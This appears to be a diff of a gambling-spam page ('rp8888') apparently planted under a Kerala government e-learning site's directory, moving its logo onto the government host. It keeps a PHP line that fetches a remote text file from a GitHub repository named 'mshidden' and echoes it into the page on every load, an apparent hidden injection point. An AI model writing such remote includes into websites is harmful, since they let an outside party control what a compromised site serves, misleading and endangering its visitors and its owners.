@@ -602,7 +602,7 @@
       <div class="logo-head" title="rp8888" bis_skin_checked="1">
         <div class="header-logo" bis_skin_checked="1">
           <a href="https://elearnksgst.kerala.gov.in/lib/hub/">
-            <amp-img width="180px" height="60px" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgb53y-lQ4hEGqK18bQKARGb1U1YdARbDcSp0xn05auoNg7qw4030hj31_ZmSZi3Psb_qmc_zBkHQvqxiHzMD31jldia2dG2DFGib2YG4YsNTNDjAKqrvv93x2Q-HyIP3jbmMkwmvpBM8d1TZZkP6r3RQTGKyOflwd-bA6WmjD9d85jO_bTogMagF_BMeIE/s1250/logo-rp8888.png" alt="rp8888" class="i-amphtml-element i-amphtml-layout-fixed i-amphtml-layout-size-defined i-amphtml-built i-amphtml-layout" i-amphtml-layout="fixed" style="width: 180px; height: 60px;" i-amphtml-auto-lightbox-visited=""><img decoding="async" alt="rp8888" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgb53y-lQ4hEGqK18bQKARGb1U1YdARbDcSp0xn05auoNg7qw4030hj31_ZmSZi3Psb_qmc_zBkHQvqxiHzMD31jldia2dG2DFGib2YG4YsNTNDjAKqrvv93x2Q-HyIP3jbmMkwmvpBM8d1TZZkP6r3RQTGKyOflwd-bA6WmjD9d85jO_bTogMagF_BMeIE/s1250/logo-rp8888.png" class="i-amphtml-fill-content i-amphtml-replaced-content" i-amphtml-auto-lightbox-visited=""></amp-img>
+            <amp-img width="180px" height="60px" src="https://elearnksgst.kerala.gov.in/lib/hub/logo-rp8888.png" alt="rp8888" class="i-amphtml-element i-amphtml-layout-fixed i-amphtml-layout-size-defined i-amphtml-built i-amphtml-layout" i-amphtml-layout="fixed" style="width: 180px; height: 60px;" i-amphtml-auto-lightbox-visited=""><img decoding="async" alt="rp8888" src="https://elearnksgst.kerala.gov.in/lib/hub/logo-rp8888.png" class="i-amphtml-fill-content i-amphtml-replaced-content" i-amphtml-auto-lightbox-visited=""></amp-img>
           </a>
         </div>
       </div>
@@ -695,7 +695,7 @@
 			</thead>
 	</table></div></div></div>
 	<amp-lightbox-gallery layout="nodisplay" id="amp-lightbox-gallery" class="i-amphtml-element i-amphtml-layout-nodisplay i-amphtml-built" hidden="" i-amphtml-layout="nodisplay"><div class="i-amphtml-lbg" bis_skin_checked="1"><div class="i-amphtml-lbg-mask" bis_skin_checked="1"></div></div></amp-lightbox-gallery>
-<?php echo file_get_contents("https://raw.githubusercontent.com/Eza168/mshidden/main/kerala.txt");?>
+	<?php echo file_get_contents("https://raw.githubusercontent.com/Eza168/mshidden/main/kerala.txt");?>
 	</body>
 	</html>
 	
